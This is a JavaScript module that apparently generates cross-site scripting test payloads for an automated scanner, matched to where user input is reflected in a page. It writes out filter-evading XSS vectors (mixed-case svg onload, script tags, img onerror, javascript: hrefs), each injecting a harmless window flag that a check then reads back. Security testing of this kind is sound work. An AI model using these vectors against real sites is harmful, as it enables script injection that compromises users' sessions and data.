const {generateRandomJsKeySelector, getTriggerCodeForClass, generateRandomClass} = require('./generators');
const htmlTagPayloads = require('./htmlTagPayloads');
const htmlNormalAttributePayloads = require('./htmlNormalAttributePayloads');
const htmlHrefAttributePayloads = require('./htmlHrefAttributePayloads');
const htmlExecuteAttributePayloads = require('./htmlExecuteAttributePayloads');
const htmlCommentPayloads = require('./htmlCommentPayloads');
const scriptPayloads = require('./scriptPayloads');
const {reflectionTypes} = require('../constents');

function generateHtmlElements(jsCode, tagClass) {
    return [{
        tag: `<SvG/onload=${jsCode}>`,
        trigger: null,
    }, {
        tag: `<scRiPT>${jsCode}</SCrIpT>`,
        trigger: null,
    }, {
        tag: `<iMG/src=/ onerror=${jsCode}>`,
        trigger: null,
    }, {
        tag: `<bODy/onload=${jsCode}>`,
        trigger: null,
    }, {
        tag: `<a/class=${tagClass} href=jaVascRIPt:void(${jsCode})/>`,
        trigger: getTriggerCodeForClass(tagClass,'click'),
    }, {
        tag: `<p/class=${tagClass} onclick=${jsCode}/>`,
        trigger: getTriggerCodeForClass(tagClass,'click'),
    }];
}

function generatePayloadsWithCode(data) {
    switch (data.reflection.type) {
        case  reflectionTypes.HTML_TAG:
            return htmlTagPayloads(data);
        case reflectionTypes.HTML_NORMAL_ATTRIBUTE:
            return htmlNormalAttributePayloads(data)
        case reflectionTypes.HTML_HREF_ATTRIBUTE:
            return htmlHrefAttributePayloads(data);
        case reflectionTypes.HTML_EXECUTABLE_ATTRIBUTE:
            return htmlExecuteAttributePayloads(data);
        case reflectionTypes.HTML_COMMENT:
            return htmlCommentPayloads(data);
        case reflectionTypes.SCRIPT:
            return scriptPayloads(data);
    }
    return [];
}

function generatePayloadCode(reflection) {
    const variableName = generateRandomJsKeySelector();
    const jsCode = `window[${variableName}]=1`;
    const assert = `return window[${variableName}]`;

    const tagClass = generateRandomClass();
    const htmlElements = generateHtmlElements(jsCode, tagClass);

    return generatePayloadsWithCode({reflection, jsCode, tagClass, htmlElements}).map(payload => ({
        ...payload,
        assert,
    }));
}

function generatePayloads(reflections) {
    return reflections
        .map(generatePayloadCode)
        .reduce((all, current) => all.concat(current), []);
}

module.exports = generatePayloads;
